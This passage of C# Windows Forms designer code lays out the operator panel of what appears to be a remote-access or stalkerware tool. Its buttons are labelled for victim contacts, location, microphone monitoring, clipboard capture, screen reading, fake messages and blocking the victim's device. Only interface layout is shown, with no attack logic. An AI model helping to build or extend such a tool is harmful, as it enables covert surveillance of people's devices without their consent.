		this.HBlockbtn.RectPressColor = System.Drawing.Color.SkyBlue;
		this.HBlockbtn.RectSelectedColor = System.Drawing.Color.SkyBlue;
		this.HBlockbtn.Size = new System.Drawing.Size(32, 25);
		this.HBlockbtn.Style = DrakeUI.Framework.UIStyle.Custom;
		this.HBlockbtn.StyleCustomMode = true;
		this.HBlockbtn.Symbol = 62005;
		this.HBlockbtn.SymbolSize = 30;
		this.HBlockbtn.TabIndex = 32;
		this.notifiform.SetToolTip(this.HBlockbtn, "Block Victim Device");
		this.contactbtn.CircleRectWidth = 30;
		this.contactbtn.Cursor = System.Windows.Forms.Cursors.Hand;
		this.contactbtn.FillColor = System.Drawing.Color.Black;
		this.contactbtn.FillHoverColor = System.Drawing.Color.FromArgb(20, 20, 20);
		this.contactbtn.FillPressColor = System.Drawing.Color.Black;
		this.contactbtn.FillSelectedColor = System.Drawing.Color.SkyBlue;
		this.contactbtn.Font = new System.Drawing.Font("Calibri", 12f);
		this.contactbtn.ForeColor = System.Drawing.Color.SkyBlue;
		this.contactbtn.ForePressColor = System.Drawing.Color.SkyBlue;
		this.contactbtn.Location = new System.Drawing.Point(46, 74);
		this.contactbtn.Name = "contactbtn";
		this.contactbtn.RectColor = System.Drawing.Color.Black;
		this.contactbtn.RectDisableColor = System.Drawing.Color.FromArgb(227, 242, 253);
		this.contactbtn.RectHoverColor = System.Drawing.Color.SkyBlue;
		this.contactbtn.RectPressColor = System.Drawing.Color.SkyBlue;
		this.contactbtn.RectSelectedColor = System.Drawing.Color.SkyBlue;
		this.contactbtn.Size = new System.Drawing.Size(32, 25);
		this.contactbtn.Style = DrakeUI.Framework.UIStyle.Custom;
		this.contactbtn.StyleCustomMode = true;
		this.contactbtn.Symbol = 57479;
		this.contactbtn.SymbolSize = 30;
		this.contactbtn.TabIndex = 19;
		this.notifiform.SetToolTip(this.contactbtn, "Victim Contacts Manager");
		this.DrakeUIButtonIcon4.CircleRectWidth = 30;
		this.DrakeUIButtonIcon4.Cursor = System.Windows.Forms.Cursors.Hand;
		this.DrakeUIButtonIcon4.FillColor = System.Drawing.Color.Black;
		this.DrakeUIButtonIcon4.FillHoverColor = System.Drawing.Color.FromArgb(20, 20, 20);
		this.DrakeUIButtonIcon4.Font = new System.Drawing.Font("Calibri", 9.5f);
		this.DrakeUIButtonIcon4.ForeColor = System.Drawing.Color.SkyBlue;
		this.DrakeUIButtonIcon4.Location = new System.Drawing.Point(121, 74);
		this.DrakeUIButtonIcon4.Name = "DrakeUIButtonIcon4";
		this.DrakeUIButtonIcon4.RectColor = System.Drawing.Color.Black;
		this.DrakeUIButtonIcon4.RectDisableColor = System.Drawing.Color.FromArgb(227, 242, 253);
		this.DrakeUIButtonIcon4.RectHoverColor = System.Drawing.Color.SkyBlue;
		this.DrakeUIButtonIcon4.RectPressColor = System.Drawing.Color.SkyBlue;
		this.DrakeUIButtonIcon4.RectSelectedColor = System.Drawing.Color.SkyBlue;
		this.DrakeUIButtonIcon4.Size = new System.Drawing.Size(32, 25);
		this.DrakeUIButtonIcon4.Style = DrakeUI.Framework.UIStyle.Custom;
		this.DrakeUIButtonIcon4.StyleCustomMode = true;
		this.DrakeUIButtonIcon4.Symbol = 62053;
		this.DrakeUIButtonIcon4.SymbolSize = 30;
		this.DrakeUIButtonIcon4.TabIndex = 34;
		this.notifiform.SetToolTip(this.DrakeUIButtonIcon4, "Victim Permissions");
		this.DrakeUIButtonIcon3.CircleRectWidth = 30;
		this.DrakeUIButtonIcon3.Cursor = System.Windows.Forms.Cursors.Hand;
		this.DrakeUIButtonIcon3.FillColor = System.Drawing.Color.Black;
		this.DrakeUIButtonIcon3.FillHoverColor = System.Drawing.Color.FromArgb(20, 20, 20);
		this.DrakeUIButtonIcon3.Font = new System.Drawing.Font("Calibri", 9.5f);
		this.DrakeUIButtonIcon3.ForeColor = System.Drawing.Color.SkyBlue;
		this.DrakeUIButtonIcon3.Location = new System.Drawing.Point(196, 43);
		this.DrakeUIButtonIcon3.Name = "DrakeUIButtonIcon3";
		this.DrakeUIButtonIcon3.RectColor = System.Drawing.Color.Black;
		this.DrakeUIButtonIcon3.RectDisableColor = System.Drawing.Color.FromArgb(227, 242, 253);
		this.DrakeUIButtonIcon3.RectHoverColor = System.Drawing.Color.SkyBlue;
		this.DrakeUIButtonIcon3.RectPressColor = System.Drawing.Color.SkyBlue;
		this.DrakeUIButtonIcon3.RectSelectedColor = System.Drawing.Color.SkyBlue;
		this.DrakeUIButtonIcon3.Size = new System.Drawing.Size(32, 25);
		this.DrakeUIButtonIcon3.Style = DrakeUI.Framework.UIStyle.Custom;
		this.DrakeUIButtonIcon3.StyleCustomMode = true;
		this.DrakeUIButtonIcon3.Symbol = 61508;
		this.DrakeUIButtonIcon3.SymbolSize = 30;
		this.DrakeUIButtonIcon3.TabIndex = 33;
		this.notifiform.SetToolTip(this.DrakeUIButtonIcon3, "Clipboard Capture");
		this.Panel16.BackColor = System.Drawing.Color.Black;
		this.Panel16.Controls.Add(this.DrakeUIButtonIcon16);
		this.Panel16.Controls.Add(this.DrakeUIButtonIcon14);
		this.Panel16.Dock = System.Windows.Forms.DockStyle.Bottom;
		this.Panel16.Location = new System.Drawing.Point(0, 112);
		this.Panel16.Margin = new System.Windows.Forms.Padding(2);
		this.Panel16.Name = "Panel16";
		this.Panel16.Size = new System.Drawing.Size(311, 28);
		this.Panel16.TabIndex = 30;
		this.DrakeUIButtonIcon16.Cursor = System.Windows.Forms.Cursors.Hand;
		this.DrakeUIButtonIcon16.Dock = System.Windows.Forms.DockStyle.Right;
		this.DrakeUIButtonIcon16.FillColor = System.Drawing.Color.Black;
		this.DrakeUIButtonIcon16.Font = new System.Drawing.Font("Microsoft Sans Serif", 12f);
		this.DrakeUIButtonIcon16.ForeColor = System.Drawing.Color.SkyBlue;
		this.DrakeUIButtonIcon16.Location = new System.Drawing.Point(201, 0);
		this.DrakeUIButtonIcon16.Margin = new System.Windows.Forms.Padding(2);
		this.DrakeUIButtonIcon16.Name = "DrakeUIButtonIcon16";
		this.DrakeUIButtonIcon16.RectColor = System.Drawing.Color.SkyBlue;
		this.DrakeUIButtonIcon16.RectDisableColor = System.Drawing.Color.FromArgb(227, 242, 253);
		this.DrakeUIButtonIcon16.Size = new System.Drawing.Size(110, 28);
		this.DrakeUIButtonIcon16.Style = DrakeUI.Framework.UIStyle.Custom;
		this.DrakeUIButtonIcon16.StyleCustomMode = true;
		this.DrakeUIButtonIcon16.Symbol = 61979;
		this.DrakeUIButtonIcon16.SymbolSize = 30;
		this.DrakeUIButtonIcon16.TabIndex = 31;
		this.DrakeUIButtonIcon16.Text = "Tracking";
		this.DrakeUIButtonIcon14.Cursor = System.Windows.Forms.Cursors.Hand;
		this.DrakeUIButtonIcon14.Dock = System.Windows.Forms.DockStyle.Left;
		this.DrakeUIButtonIcon14.FillColor = System.Drawing.Color.Black;
		this.DrakeUIButtonIcon14.Font = new System.Drawing.Font("Microsoft Sans Serif", 12f);
		this.DrakeUIButtonIcon14.ForeColor = System.Drawing.Color.SkyBlue;
		this.DrakeUIButtonIcon14.Location = new System.Drawing.Point(0, 0);
		this.DrakeUIButtonIcon14.Margin = new System.Windows.Forms.Padding(2);
		this.DrakeUIButtonIcon14.Name = "DrakeUIButtonIcon14";
		this.DrakeUIButtonIcon14.RectColor = System.Drawing.Color.SkyBlue;
		this.DrakeUIButtonIcon14.RectDisableColor = System.Drawing.Color.FromArgb(227, 242, 253);
		this.DrakeUIButtonIcon14.Size = new System.Drawing.Size(110, 28);
		this.DrakeUIButtonIcon14.Style = DrakeUI.Framework.UIStyle.Custom;
		this.DrakeUIButtonIcon14.StyleCustomMode = true;
		this.DrakeUIButtonIcon14.Symbol = 61549;
		this.DrakeUIButtonIcon14.SymbolSize = 30;
		this.DrakeUIButtonIcon14.TabIndex = 30;
		this.DrakeUIButtonIcon14.Text = "Firewall";
		this.micbtn.CircleRectWidth = 30;
		this.micbtn.Cursor = System.Windows.Forms.Cursors.Hand;
		this.micbtn.FillColor = System.Drawing.Color.Black;
		this.micbtn.FillHoverColor = System.Drawing.Color.SkyBlue;
		this.micbtn.FillPressColor = System.Drawing.Color.Black;
		this.micbtn.FillSelectedColor = System.Drawing.Color.SkyBlue;
		this.micbtn.Font = new System.Drawing.Font("Calibri", 12f);
		this.micbtn.ForeColor = System.Drawing.Color.SkyBlue;
		this.micbtn.ForePressColor = System.Drawing.Color.SkyBlue;
		this.micbtn.Location = new System.Drawing.Point(176, 10);
		this.micbtn.Name = "micbtn";
		this.micbtn.RectColor = System.Drawing.Color.Black;
		this.micbtn.RectDisableColor = System.Drawing.Color.FromArgb(227, 242, 253);
		this.micbtn.RectHoverColor = System.Drawing.Color.SkyBlue;
		this.micbtn.RectPressColor = System.Drawing.Color.SkyBlue;
		this.micbtn.RectSelectedColor = System.Drawing.Color.SkyBlue;
		this.micbtn.Size = new System.Drawing.Size(32, 25);
		this.micbtn.Style = DrakeUI.Framework.UIStyle.Custom;
		this.micbtn.StyleCustomMode = true;
		this.micbtn.Symbol = 57471;
		this.micbtn.SymbolSize = 30;
		this.micbtn.TabIndex = 20;
		this.notifiform.SetToolTip(this.micbtn, "Microphone Monitor");
		this.screenreadbtn.CircleRectWidth = 30;
		this.screenreadbtn.Cursor = System.Windows.Forms.Cursors.Hand;
		this.screenreadbtn.FillColor = System.Drawing.Color.Black;
		this.screenreadbtn.FillHoverColor = System.Drawing.Color.SkyBlue;
		this.screenreadbtn.FillPressColor = System.Drawing.Color.Black;
		this.screenreadbtn.FillSelectedColor = System.Drawing.Color.SkyBlue;
		this.screenreadbtn.Font = new System.Drawing.Font("Calibri", 12f);
		this.screenreadbtn.ForeColor = System.Drawing.Color.SkyBlue;
		this.screenreadbtn.ForePressColor = System.Drawing.Color.SkyBlue;
		this.screenreadbtn.Location = new System.Drawing.Point(213, 10);
		this.screenreadbtn.Name = "screenreadbtn";
		this.screenreadbtn.RectColor = System.Drawing.Color.Black;
		this.screenreadbtn.RectDisableColor = System.Drawing.Color.FromArgb(227, 242, 253);
		this.screenreadbtn.RectHoverColor = System.Drawing.Color.SkyBlue;
		this.screenreadbtn.RectPressColor = System.Drawing.Color.SkyBlue;
		this.screenreadbtn.RectSelectedColor = System.Drawing.Color.SkyBlue;
		this.screenreadbtn.Size = new System.Drawing.Size(32, 25);
		this.screenreadbtn.Style = DrakeUI.Framework.UIStyle.Custom;
		this.screenreadbtn.StyleCustomMode = true;
		this.screenreadbtn.Symbol = 61450;
		this.screenreadbtn.SymbolSize = 30;
		this.screenreadbtn.TabIndex = 18;
		this.notifiform.SetToolTip(this.screenreadbtn, "Screen Reader V3");
		this.locationbtn.CircleRectWidth = 30;
		this.locationbtn.Cursor = System.Windows.Forms.Cursors.Hand;
		this.locationbtn.FillColor = System.Drawing.Color.Black;
		this.locationbtn.FillHoverColor = System.Drawing.Color.SkyBlue;
		this.locationbtn.FillPressColor = System.Drawing.Color.Black;
		this.locationbtn.FillSelectedColor = System.Drawing.Color.SkyBlue;
		this.locationbtn.Font = new System.Drawing.Font("Calibri", 12f);
		this.locationbtn.ForeColor = System.Drawing.Color.SkyBlue;
		this.locationbtn.ForePressColor = System.Drawing.Color.SkyBlue;
		this.locationbtn.Location = new System.Drawing.Point(233, 74);
		this.locationbtn.Name = "locationbtn";
		this.locationbtn.RectColor = System.Drawing.Color.Black;
		this.locationbtn.RectDisableColor = System.Drawing.Color.FromArgb(227, 242, 253);
		this.locationbtn.RectHoverColor = System.Drawing.Color.White;
		this.locationbtn.RectPressColor = System.Drawing.Color.White;
		this.locationbtn.RectSelectedColor = System.Drawing.Color.White;
		this.locationbtn.Size = new System.Drawing.Size(32, 25);
		this.locationbtn.Style = DrakeUI.Framework.UIStyle.Custom;
		this.locationbtn.StyleCustomMode = true;
		this.locationbtn.Symbol = 61505;
		this.locationbtn.SymbolSize = 30;
		this.locationbtn.TabIndex = 22;
		this.notifiform.SetToolTip(this.locationbtn, "Victim Location Manager");
		this.DrakeUIButtonIcon6.CircleRectWidth = 30;
		this.DrakeUIButtonIcon6.Cursor = System.Windows.Forms.Cursors.Hand;
		this.DrakeUIButtonIcon6.FillColor = System.Drawing.Color.Black;
		this.DrakeUIButtonIcon6.FillHoverColor = System.Drawing.Color.SkyBlue;
		this.DrakeUIButtonIcon6.Font = new System.Drawing.Font("Calibri", 9.5f);
		this.DrakeUIButtonIcon6.ForeColor = System.Drawing.Color.SkyBlue;
		this.DrakeUIButtonIcon6.Location = new System.Drawing.Point(158, 74);
		this.DrakeUIButtonIcon6.Name = "DrakeUIButtonIcon6";
		this.DrakeUIButtonIcon6.RectColor = System.Drawing.Color.Black;
		this.DrakeUIButtonIcon6.RectDisableColor = System.Drawing.Color.FromArgb(227, 242, 253);
		this.DrakeUIButtonIcon6.RectHoverColor = System.Drawing.Color.SkyBlue;
		this.DrakeUIButtonIcon6.RectPressColor = System.Drawing.Color.SkyBlue;
		this.DrakeUIButtonIcon6.RectSelectedColor = System.Drawing.Color.SkyBlue;
		this.DrakeUIButtonIcon6.Size = new System.Drawing.Size(32, 25);
		this.DrakeUIButtonIcon6.Style = DrakeUI.Framework.UIStyle.Custom;
		this.DrakeUIButtonIcon6.StyleCustomMode = true;
		this.DrakeUIButtonIcon6.Symbol = 62075;
		this.DrakeUIButtonIcon6.SymbolSize = 30;
		this.DrakeUIButtonIcon6.TabIndex = 36;
		this.notifiform.SetToolTip(this.DrakeUIButtonIcon6, "Show Fake Message");
		this.Panel20.Controls.Add(this.FWPANEL);
		this.Panel20.Controls.Add(this.TRKPANEL);
		this.Panel20.Dock = System.Windows.Forms.DockStyle.Bottom;
		this.Panel20.Location = new System.Drawing.Point(0, 140);
		this.Panel20.Margin = new System.Windows.Forms.Padding(2);
		this.Panel20.Name = "Panel20";
		this.Panel20.Size = new System.Drawing.Size(311, 375);
		this.Panel20.TabIndex = 40;
		this.FWPANEL.Controls.Add(this.Label4);
		this.FWPANEL.Controls.Add(this.DrakeUIAvatar9);
		this.FWPANEL.Controls.Add(this.DrakeUIAvatar5);
		this.FWPANEL.Controls.Add(this.DrakeUIAvatar8);
		this.FWPANEL.Controls.Add(this.FWstatus);
		this.FWPANEL.Controls.Add(this.DGFW);
		this.FWPANEL.Dock = System.Windows.Forms.DockStyle.Fill;
		this.FWPANEL.Location = new System.Drawing.Point(0, 0);
		this.FWPANEL.Margin = new System.Windows.Forms.Padding(2);
		this.FWPANEL.Name = "FWPANEL";
		this.FWPANEL.Size = new System.Drawing.Size(311, 375);
		this.FWPANEL.TabIndex = 29;
		this.Label4.Dock = System.Windows.Forms.DockStyle.Fill;
		this.Label4.Location = new System.Drawing.Point(78, 0);
		this.Label4.Margin = new System.Windows.Forms.Padding(2, 0, 2, 0);
		this.Label4.Name = "Label4";
		this.Label4.Size = new System.Drawing.Size(213, 34);
		this.Label4.TabIndex = 40;
		this.Label4.Text = "Firewall Apps";
		this.Label4.TextAlign = System.Drawing.ContentAlignment.MiddleCenter;
		this.DrakeUIAvatar9.AvatarSize = 25;
		this.DrakeUIAvatar9.Cursor = System.Windows.Forms.Cursors.Hand;
		this.DrakeUIAvatar9.Dock = System.Windows.Forms.DockStyle.Left;
		this.DrakeUIAvatar9.FillColor = System.Drawing.Color.Black;
		this.DrakeUIAvatar9.Font = new System.Drawing.Font("Calibri", 12f);
		this.DrakeUIAvatar9.ForeColor = System.Drawing.Color.SkyBlue;
		this.DrakeUIAvatar9.Location = new System.Drawing.Point(52, 0);
		this.DrakeUIAvatar9.Name = "DrakeUIAvatar9";
		this.DrakeUIAvatar9.Size = new System.Drawing.Size(26, 34);
		this.DrakeUIAvatar9.Style = DrakeUI.Framework.UIStyle.Custom;
		this.DrakeUIAvatar9.StyleCustomMode = true;
		this.DrakeUIAvatar9.Symbol = 62093;
		this.DrakeUIAvatar9.SymbolSize = 25;
		this.DrakeUIAvatar9.TabIndex = 38;
		this.notifiform.SetToolTip(this.DrakeUIAvatar9, "Stop");
		this.DrakeUIAvatar5.AvatarSize = 25;
		this.DrakeUIAvatar5.Cursor = System.Windows.Forms.Cursors.Hand;
		this.DrakeUIAvatar5.Dock = System.Windows.Forms.DockStyle.Left;
		this.DrakeUIAvatar5.FillColor = System.Drawing.Color.Black;
		this.DrakeUIAvatar5.Font = new System.Drawing.Font("Calibri", 12f);
		this.DrakeUIAvatar5.ForeColor = System.Drawing.Color.SkyBlue;
		this.DrakeUIAvatar5.Location = new System.Drawing.Point(26, 0);
		this.DrakeUIAvatar5.Name = "DrakeUIAvatar5";
		this.DrakeUIAvatar5.Size = new System.Drawing.Size(26, 34);
		this.DrakeUIAvatar5.Style = DrakeUI.Framework.UIStyle.Custom;
		this.DrakeUIAvatar5.StyleCustomMode = true;
		this.DrakeUIAvatar5.Symbol = 61561;
		this.DrakeUIAvatar5.SymbolSize = 25;
		this.DrakeUIAvatar5.TabIndex = 36;
		this.notifiform.SetToolTip(this.DrakeUIAvatar5, "Refresh");
		this.DrakeUIAvatar8.AvatarSize = 25;
		this.DrakeUIAvatar8.Cursor = System.Windows.Forms.Cursors.Hand;
		this.DrakeUIAvatar8.Dock = System.Windows.Forms.DockStyle.Left;
		this.DrakeUIAvatar8.FillColor = System.Drawing.Color.Black;
		this.DrakeUIAvatar8.Font = new System.Drawing.Font("Calibri", 12f);
		this.DrakeUIAvatar8.ForeColor = System.Drawing.Color.SkyBlue;
		this.DrakeUIAvatar8.Location = new System.Drawing.Point(0, 0);
		this.DrakeUIAvatar8.Name = "DrakeUIAvatar8";
		this.DrakeUIAvatar8.Size = new System.Drawing.Size(26, 34);
		this.DrakeUIAvatar8.Style = DrakeUI.Framework.UIStyle.Custom;
		this.DrakeUIAvatar8.StyleCustomMode = true;
		this.DrakeUIAvatar8.Symbol = 61764;
		this.DrakeUIAvatar8.SymbolSize = 25;
		this.DrakeUIAvatar8.TabIndex = 37;
		this.notifiform.SetToolTip(this.DrakeUIAvatar8, "Start");
		this.FWstatus.AvatarSize = 25;
		this.FWstatus.Cursor = System.Windows.Forms.Cursors.Default;
		this.FWstatus.Dock = System.Windows.Forms.DockStyle.Right;
		this.FWstatus.FillColor = System.Drawing.Color.Black;
		this.FWstatus.Font = new System.Drawing.Font("Calibri", 12f);
		this.FWstatus.ForeColor = System.Drawing.Color.SkyBlue;
		this.FWstatus.Location = new System.Drawing.Point(291, 0);
		this.FWstatus.Name = "FWstatus";
		this.FWstatus.Size = new System.Drawing.Size(20, 34);
		this.FWstatus.Style = DrakeUI.Framework.UIStyle.Custom;
		this.FWstatus.StyleCustomMode = true;
		this.FWstatus.Symbol = 61713;
		this.FWstatus.SymbolSize = 25;
		this.FWstatus.TabIndex = 39;
		this.notifiform.SetToolTip(this.FWstatus, "Firewall Status");
		this.DGFW.AccessibleRole = System.Windows.Forms.AccessibleRole.None;
		this.DGFW.AllowUserToAddRows = false;
		this.DGFW.AllowUserToDeleteRows = false;
		this.DGFW.AllowUserToResizeColumns = false;
		this.DGFW.AllowUserToResizeRows = false;
		dataGridViewCellStyle6.Alignment = System.Windows.Forms.DataGridViewContentAlignment.MiddleCenter;
		dataGridViewCellStyle6.BackColor = System.Drawing.Color.Black;
		dataGridViewCellStyle6.ForeColor = System.Drawing.Color.SkyBlue;
		dataGridViewCellStyle6.SelectionBackColor = System.Drawing.Color.SkyBlue;
		dataGridViewCellStyle6.SelectionForeColor = System.Drawing.Color.Black;
		this.DGFW.AlternatingRowsDefaultCellStyle = dataGridViewCellStyle6;
		this.DGFW.AutoSizeColumnsMode = System.Windows.Forms.DataGridViewAutoSizeColumnsMode.Fill;
		this.DGFW.AutoSizeRowsMode = System.Windows.Forms.DataGridViewAutoSizeRowsMode.AllCells;
		this.DGFW.BackgroundColor = System.Drawing.Color.Black;
		this.DGFW.ColumnHeadersBorderStyle = System.Windows.Forms.DataGridViewHeaderBorderStyle.Single;
		dataGridViewCellStyle7.Alignment = System.Windows.Forms.DataGridViewContentAlignment.MiddleCenter;
		dataGridViewCellStyle7.BackColor = System.Drawing.Color.SkyBlue;
		dataGridViewCellStyle7.Font = new System.Drawing.Font("Calibri", 12f);
		dataGridViewCellStyle7.ForeColor = System.Drawing.Color.SkyBlue;
		dataGridViewCellStyle7.SelectionBackColor = System.Drawing.Color.SkyBlue;
		dataGridViewCellStyle7.SelectionForeColor = System.Drawing.Color.Black;
		dataGridViewCellStyle7.WrapMode = System.Windows.Forms.DataGridViewTriState.True;
		this.DGFW.ColumnHeadersDefaultCellStyle = dataGridViewCellStyle7;
		this.DGFW.ColumnHeadersHeightSizeMode = System.Windows.Forms.DataGridViewColumnHeadersHeightSizeMode.AutoSize;
		this.DGFW.ContextMenuStrip = this.FWctx;
		this.DGFW.Cursor = System.Windows.Forms.Cursors.Hand;
		dataGridViewCellStyle8.Alignment = System.Windows.Forms.DataGridViewContentAlignment.MiddleCenter;
		dataGridViewCellStyle8.BackColor = System.Drawing.Color.Black;
		dataGridViewCellStyle8.Font = new System.Drawing.Font("Calibri", 12f);
		dataGridViewCellStyle8.ForeColor = System.Drawing.Color.SkyBlue;
		dataGridViewCellStyle8.SelectionBackColor = System.Drawing.Color.SkyBlue;
		dataGridViewCellStyle8.SelectionForeColor = System.Drawing.Color.FromArgb(10, 0, 10);
		dataGridViewCellStyle8.WrapMode = System.Windows.Forms.DataGridViewTriState.False;
		this.DGFW.DefaultCellStyle = dataGridViewCellStyle8;
		this.DGFW.Dock = System.Windows.Forms.DockStyle.Bottom;
		this.DGFW.EditMode = System.Windows.Forms.DataGridViewEditMode.EditProgrammatically;
		this.DGFW.EnableHeadersVisualStyles = false;
		this.DGFW.GridColor = System.Drawing.Color.SkyBlue;
		this.DGFW.Location = new System.Drawing.Point(0, 34);
		this.DGFW.MultiSelect = false;
		this.DGFW.Name = "DGFW";
		this.DGFW.ReadOnly = true;
		this.DGFW.RowHeadersBorderStyle = System.Windows.Forms.DataGridViewHeaderBorderStyle.Single;
		dataGridViewCellStyle9.Alignment = System.Windows.Forms.DataGridViewContentAlignment.MiddleCenter;
		dataGridViewCellStyle9.BackColor = System.Drawing.Color.Black;
		dataGridViewCellStyle9.Font = new System.Drawing.Font("Calibri", 12f);
		dataGridViewCellStyle9.ForeColor = System.Drawing.Color.SkyBlue;
		dataGridViewCellStyle9.SelectionBackColor = System.Drawing.Color.SkyBlue;
		dataGridViewCellStyle9.SelectionForeColor = System.Drawing.Color.FromArgb(10, 0, 10);
		dataGridViewCellStyle9.WrapMode = System.Windows.Forms.DataGridViewTriState.True;
		this.DGFW.RowHeadersDefaultCellStyle = dataGridViewCellStyle9;
		this.DGFW.RowHeadersVisible = false;
		dataGridViewCellStyle10.Alignment = System.Windows.Forms.DataGridViewContentAlignment.MiddleCenter;
		dataGridViewCellStyle10.BackColor = System.Drawing.Color.Black;
		dataGridViewCellStyle10.ForeColor = System.Drawing.Color.SkyBlue;
		dataGridViewCellStyle10.SelectionBackColor = System.Drawing.Color.SkyBlue;
		dataGridViewCellStyle10.SelectionForeColor = System.Drawing.Color.FromArgb(10, 0, 10);
		this.DGFW.RowsDefaultCellStyle = dataGridViewCellStyle10;
		this.DGFW.SelectionMode = System.Windows.Forms.DataGridViewSelectionMode.FullRowSelect;
		this.DGFW.ShowCellToolTips = false;
		this.DGFW.Size = new System.Drawing.Size(311, 341);
		this.DGFW.TabIndex = 4;
		this.DGFW.Tag = "b";
		this.FWctx.BackColor = System.Drawing.Color.Black;
		this.FWctx.Font = new System.Drawing.Font("Calibri", 12f);
		this.FWctx.ImageScalingSize = new System.Drawing.Size(20, 20);
		this.FWctx.Items.AddRange(new System.Windows.Forms.ToolStripItem[3] { this.AllowAppToolStripMenuItem, this.ToolStripMenuItem15, this.ToolStripMenuItem25 });
		this.FWctx.Name = "ctxconnection";
		this.FWctx.RenderMode = System.Windows.Forms.ToolStripRenderMode.System;
		this.FWctx.Size = new System.Drawing.Size(188, 130);
		this.AllowAppToolStripMenuItem.ForeColor = System.Drawing.Color.SkyBlue;
		this.AllowAppToolStripMenuItem.Image = (System.Drawing.Image)resources.GetObject("AllowAppToolStripMenuItem.Image");
		this.AllowAppToolStripMenuItem.ImageScaling = System.Windows.Forms.ToolStripItemImageScaling.None;
		this.AllowAppToolStripMenuItem.Name = "AllowAppToolStripMenuItem";
		this.AllowAppToolStripMenuItem.Size = new System.Drawing.Size(187, 42);
		this.AllowAppToolStripMenuItem.Text = "Allow App";
		this.ToolStripMenuItem15.ForeColor = System.Drawing.Color.SkyBlue;
		this.ToolStripMenuItem15.Image = (System.Drawing.Image)resources.GetObject("ToolStripMenuItem15.Image");
		this.ToolStripMenuItem15.ImageScaling = System.Windows.Forms.ToolStripItemImageScaling.None;
		this.ToolStripMenuItem15.Name = "ToolStripMenuItem15";
		this.ToolStripMenuItem15.Size = new System.Drawing.Size(187, 42);
		this.ToolStripMenuItem15.Text = "Block App";
		this.ToolStripMenuItem25.ForeColor = System.Drawing.Color.SkyBlue;
		this.ToolStripMenuItem25.Image = (System.Drawing.Image)resources.GetObject("ToolStripMenuItem25.Image");
		this.ToolStripMenuItem25.ImageScaling = System.Windows.Forms.ToolStripItemImageScaling.None;
		this.ToolStripMenuItem25.Name = "ToolStripMenuItem25";
		this.ToolStripMenuItem25.Size = new System.Drawing.Size(187, 42);
		this.ToolStripMenuItem25.Text = "Add to tracker";
		this.TRKPANEL.Controls.Add(this.DGVTRK);
		this.TRKPANEL.Controls.Add(this.Panel17);
		this.TRKPANEL.Controls.Add(this.recordsShowpanel);
		this.TRKPANEL.Dock = System.Windows.Forms.DockStyle.Fill;
		this.TRKPANEL.Location = new System.Drawing.Point(0, 0);
		this.TRKPANEL.Margin = new System.Windows.Forms.Padding(2);
		this.TRKPANEL.Name = "TRKPANEL";
		this.TRKPANEL.Size = new System.Drawing.Size(311, 375);
		this.TRKPANEL.TabIndex = 30;
		this.DGVTRK.AccessibleRole = System.Windows.Forms.AccessibleRole.None;
		this.DGVTRK.AllowUserToAddRows = false;
		this.DGVTRK.AllowUserToDeleteRows = false;
		this.DGVTRK.AllowUserToResizeColumns = false;
		this.DGVTRK.AllowUserToResizeRows = false;
		dataGridViewCellStyle11.Alignment = System.Windows.Forms.DataGridViewContentAlignment.MiddleCenter;
		dataGridViewCellStyle11.BackColor = System.Drawing.Color.Black;
		dataGridViewCellStyle11.ForeColor = System.Drawing.Color.SkyBlue;
		dataGridViewCellStyle11.SelectionBackColor = System.Drawing.Color.White;
		dataGridViewCellStyle11.SelectionForeColor = System.Drawing.Color.Black;
		this.DGVTRK.AlternatingRowsDefaultCellStyle = dataGridViewCellStyle11;
		this.DGVTRK.AutoSizeColumnsMode = System.Windows.Forms.DataGridViewAutoSizeColumnsMode.Fill;
		this.DGVTRK.AutoSizeRowsMode = System.Windows.Forms.DataGridViewAutoSizeRowsMode.AllCells;
		this.DGVTRK.BackgroundColor = System.Drawing.Color.Black;
		this.DGVTRK.ColumnHeadersBorderStyle = System.Windows.Forms.DataGridViewHeaderBorderStyle.Single;
		dataGridViewCellStyle12.Alignment = System.Windows.Forms.DataGridViewContentAlignment.MiddleCenter;
		dataGridViewCellStyle12.BackColor = System.Drawing.Color.SkyBlue;
		dataGridViewCellStyle12.Font = new System.Drawing.Font("Calibri", 12f);
		dataGridViewCellStyle12.ForeColor = System.Drawing.Color.SkyBlue;
		dataGridViewCellStyle12.SelectionBackColor = System.Drawing.Color.White;
		dataGridViewCellStyle12.SelectionForeColor = System.Drawing.Color.Black;
		dataGridViewCellStyle12.WrapMode = System.Windows.Forms.DataGridViewTriState.True;
		this.DGVTRK.ColumnHeadersDefaultCellStyle = dataGridViewCellStyle12;
		this.DGVTRK.ColumnHeadersHeightSizeMode = System.Windows.Forms.DataGridViewColumnHeadersHeightSizeMode.AutoSize;
		this.DGVTRK.ContextMenuStrip = this.TRKctx;
		this.DGVTRK.Cursor = System.Windows.Forms.Cursors.Hand;
		dataGridViewCellStyle13.Alignment = System.Windows.Forms.DataGridViewContentAlignment.MiddleCenter;
		dataGridViewCellStyle13.BackColor = System.Drawing.Color.Black;
		dataGridViewCellStyle13.Font = new System.Drawing.Font("Calibri", 12f);
		dataGridViewCellStyle13.ForeColor = System.Drawing.Color.SkyBlue;
		dataGridViewCellStyle13.SelectionBackColor = System.Drawing.Color.White;
		dataGridViewCellStyle13.SelectionForeColor = System.Drawing.Color.FromArgb(10, 0, 10);
		dataGridViewCellStyle13.WrapMode = System.Windows.Forms.DataGridViewTriState.False;
		this.DGVTRK.DefaultCellStyle = dataGridViewCellStyle13;
		this.DGVTRK.Dock = System.Windows.Forms.DockStyle.Fill;
		this.DGVTRK.EditMode = System.Windows.Forms.DataGridViewEditMode.EditProgrammatically;
		this.DGVTRK.EnableHeadersVisualStyles = false;
		this.DGVTRK.GridColor = System.Drawing.Color.SkyBlue;
		this.DGVTRK.Location = new System.Drawing.Point(0, 24);
		this.DGVTRK.MultiSelect = false;
		this.DGVTRK.Name = "DGVTRK";
		this.DGVTRK.ReadOnly = true;
		this.DGVTRK.RowHeadersBorderStyle = System.Windows.Forms.DataGridViewHeaderBorderStyle.Single;
		dataGridViewCellStyle14.Alignment = System.Windows.Forms.DataGridViewContentAlignment.MiddleCenter;
		dataGridViewCellStyle14.BackColor = System.Drawing.Color.Black;
		dataGridViewCellStyle14.Font = new System.Drawing.Font("Calibri", 12f);
		dataGridViewCellStyle14.ForeColor = System.Drawing.Color.SkyBlue;
		dataGridViewCellStyle14.SelectionBackColor = System.Drawing.Color.White;
		dataGridViewCellStyle14.SelectionForeColor = System.Drawing.Color.FromArgb(10, 0, 10);
		dataGridViewCellStyle14.WrapMode = System.Windows.Forms.DataGridViewTriState.True;
		this.DGVTRK.RowHeadersDefaultCellStyle = dataGridViewCellStyle14;
